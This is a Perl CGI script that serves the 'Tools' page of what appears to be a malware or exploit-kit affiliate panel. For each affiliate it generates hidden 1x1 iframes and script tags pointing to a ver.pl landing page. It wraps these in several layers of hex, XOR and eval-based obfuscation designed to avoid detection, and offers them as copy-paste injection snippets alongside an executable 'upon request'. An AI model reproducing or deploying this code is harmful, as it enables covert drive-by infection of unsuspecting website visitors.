#!/usr/bin/perl
  
  # index.pl
  use CGI;
  use CGI::Carp qw/fatalsToBrowser warningsToBrowser/;
  use CGI::Session ( '-ip_match' );
  use DBI;
  require "xpl/config.pl";
  require "xpl/lib/JsXOR.pm";
  
  $session = CGI::Session->load();
  $q = new CGI;
  
  $cook = $q->param('cook');
  
  if($session->is_expired)
  {
    print $q->header(-cache_control=>"no-cache, no-store, must-revalidate");
    print "Your has session expired. Please login again.";
	print "<br/><a href='login.pl>Login</a>";
  }
  elsif($session->is_empty)
  {
    #print $q->header(-cache_control=>"no-cache, no-store, must-revalidate");
    print "Status: 301 Moved\nLocation: login.pl\n\n";
  }
  else
  {
  	$db_name = 'DBI:mysql:' . $config{MysqlDB};
    $dbh = DBI->connect($db_name, $config{MysqlUser}, $config{MysqlPass}) || die "Could not connect to database: $DBI::errstr";
	$sth = $dbh->prepare( "SELECT * FROM affiliates WHERE cook = ?" );
	$sth->execute( $cook );
	$sth->bind_columns( \$id, \$username, \$password, \$affid, \$email, \$cook, \$cook12, \$cook13, \$cook14, \$cook15, \$cook16, \$cook17, \$cook18, \$cook19, \$cook20, \$cook21, \$cook22, \$cook23,);
	$sth->fetch();
    $aff = $affid;
	
	##################### Begin XOR encryption ##################
	$urliframe = '<iframe src="' . $config{UrlToFolder} . '/ver.pl?aff=' . $aff . '"  marginwidth="1px" align="center" frameborder="0" height="1" scrolling="no" width="1"></iframe>';

	my @values = split('', $urliframe);
        foreach my $val (@values)
        {
          $val =~ s/(.|\n)/sprintf("%02lx", ord $1)/eg;
          $FUD .= '\u00' . $val;
        }
	
	$firststage = 'document.write(\'' . $FUD . '\')';
	$secondstage = JsXOR::excryptxorframe($firststage);
	$encryptediframe3 = '<script type="text/javascript">' . $secondstage . '</script>';
	$encryptediframe3 =~ s/</&lt;/g;
	$encryptediframe3 =~ s/>/&gt;/g;
	$encryptediframe3 =~ s/"/&quot;/g;
        ###################### END XOR Encryption ###################
        
        ###################### BEGIN COOKIE ENCRYPTION #####################
        $urliframe = '<iframe src="' . $config{UrlToFolder} . '/ver.pl?aff=' . $aff . '"  marginwidth="1px" align="center" frameborder="0" height="1" scrolling="no" width="1"></iframe>';
        $thingsencrypted = JsXOR::newxorframe($urliframe);
        $encryptediframe2 = '<script type="text/javascript">' . $thingsencrypted . '</script>';
        $encryptediframe2 =~ s/</&lt;/g;
	$encryptediframe2 =~ s/>/&gt;/g;
	$encryptediframe2 =~ s/"/&quot;/g;
        ###################### END COOKIE ENCRYPTION #####################

        ###################### BEGIN OBF ENCRYPTION ######################
        $urliframe = '<iframe src="' . $config{UrlToFolder} . '/ver.pl?aff=' . $aff . '"  marginwidth="1px" align="center" frameborder="0" height="1" scrolling="no" width="1"></iframe>';
        $randomerase = JsXOR::generate_random_string(2);
        $garbagecomment = JsXOR::generate_random_string(15);
        
        $urliframe2 = 'document.write(\'' . $urliframe . '\')';
        
        $FUD = "";
	my @values = split('', $urliframe2);
        foreach my $val (@values)
        {
          $val =~ s/(.|\n)/sprintf("%02lx", ord $1)/eg;
          $FUD .= $randomerase . $val;
        }
        
        my @bitss = split('', $randomerase);
        $repbit1 = $bitss[0];
        $repbit2 = $bitss[1];
        $repbit3 = $bitss[2];
        $repbit4 = $bitss[3];
	
        $secondstage = <<EOF;

blah='$FUD';
rep1 = '%';
repbit1 = '$repbit1';
repbit2 = '$repbit2';
repbit3 = '$repbit3';
repbit4 = '$repbit4';

bfbits = [117, 110, 101, 115, 99, 97, 112, 101];

bftext = '';
for (i=0; i<bfbits.length; i++) {
    bftext += String./* $garbagecomment */fromCharCode(bfbits[i]);
}


blahstring="var blahfunction1=" + bftext;
eval(blahstring);

rep =repbit1 + repbit2 + repbit3 + repbit4;
ume = blah.replace(new RegExp(rep, "g"), rep1);
eme = blahfunction1(ume);

eval(eme);

EOF

	$encryptediframe = '<script type="text/javascript">' . $secondstage . '</script>';
	$encryptediframe =~ s/</&lt;/g;
	$encryptediframe =~ s/>/&gt;/g;
	$encryptediframe =~ s/"/&quot;/g;
        ##################################################################

        ######################## HEADER JS IFRAME ########################
        $urliframe = $config{UrlToFolder} . '/trackstats.pl?aff=' . $aff;
        $jsiframehead = '<script type="text/javascript" language="javascript" src="' . $urliframe . '"></script>';
        $jsiframehead =~ s/</&lt;/g;
	$jsiframehead =~ s/>/&gt;/g;
	$jsiframehead =~ s/"/&quot;/g;
        $urliframe = '<iframe src="' . $config{UrlToFolder} . '/ver.pl?aff=' . $aff . '"  marginwidth="1px" align="center" frameborder="0" height="1" scrolling="no" width="1"></iframe>';
        ######################### END JS IFRAME ##########################
        
	
    print $q->header(-cache_control=>"no-cache, no-store, must-revalidate");
	indexalltab();
  }
  
sub indexalltab
{
 print <<THEHTMLINDEX;
 
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<HTML xmlns="http://www.w3.org/1999/xhtml" lang="fr"><HEAD><META http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">

<TITLE>$config{NetName} - Tools</TITLE>
    <LINK rel="stylesheet" type="text/css" href="style/style3.css" media="all">
    
</HEAD><BODY>

<DIV id="top_nav">
	<DIV class="content">
    
        <UL>
            <LI><A href="index.pl?cook=$cook" title="Home" class="Home">Home</A></LI>
            <LI><A href="tools.pl?cook=$cook" title="tools">Tools</A></LI>
            <LI><A href="stats.pl?cook=$cook" title="Report">Report</A></LI>
            <LI><A href="programs.pl?cook=$cook" title="Account">Account</A></LI>
            <LI><A href="help.pl?cook=$cook" title="Support">Support</A></LI>
            <LI><A href="#" title=""></A></LI>
            <LI><A href="login.pl?action=logout" title="Log Out">Log Out</A></LI>
        </UL>
        
    </DIV>
</DIV>
<center>

<br><br><br>
<b>
<h2>[ Tools Section ]</h2><br>

<DIV id="main">
<DIV class="content">
<DIV id="pages">
<DIV id="home">
<DIV>
</DIV>
<br><br>
Direct link (For DRM):<br> 
<input type="text" style="width: 100%;" readonly="readonly" onclick="this.focus(); this.select();" value="$config{UrlToFolder}/ver.pl?aff=$aff"> 
 
<br><br>
Iframe link ( To use without javascript [ NOT RECOMENDED ] ):<br> 
<textarea style="width: 100%; height: 100%;" readonly="readonly" onclick="this.focus(); this.select();">$urliframe</textarea> 
 
<br><br> 
JS Iframe Head (More silent):<br> 
<textarea style="width: 100%; height: 100%;" readonly="readonly" onclick="this.focus(); this.select();">$jsiframehead</textarea>

<br><br> 
XOR Encrypted Iframe link ( To use with javascript [ RECOMENDED ] ):<br> 
<textarea style="width: 100%; height: 110px; font-size:4;" readonly="readonly" onclick="this.focus(); this.select();">$encryptediframe3</textarea>
 
<br><br>
Cookie Encrypted Iframe link ( To use with javascript [ RECOMENDED ] ):<br> 
<textarea style="width: 100%; height: 110px; font-size:4;" readonly="readonly" onclick="this.focus(); this.select();">$encryptediframe2</textarea>
 
<br><br>
Split Encrypted Iframe link ( To use with javascript [ RECOMENDED ] ):<br> 
<textarea style="width: 100%; height: 110px; font-size:4;" readonly="readonly" onclick="this.focus(); this.select();">$encryptediframe</textarea>
 
<br><br>
Downloadable executable:<br>
<input type="text" style="width: 100%;" readonly="readonly" onclick="this.focus(); this.select();" value="Upon request only"> 
<br><br>
</DIV>
</DIV>
</DIV>
</DIV>

<br><br><br>
if you have questions or software request, contact us at <a href="mailto:$config{NetEmail}"> $config{NetEmail}</a>
<br><br>
</center>

<DIV id="footer">
	<DIV class="content">
        <DIV class="copyright">
        	<P><BR>
        </DIV>        
    </DIV>
</DIV>

</body>
</html>
 
 
THEHTMLINDEX
}

1;
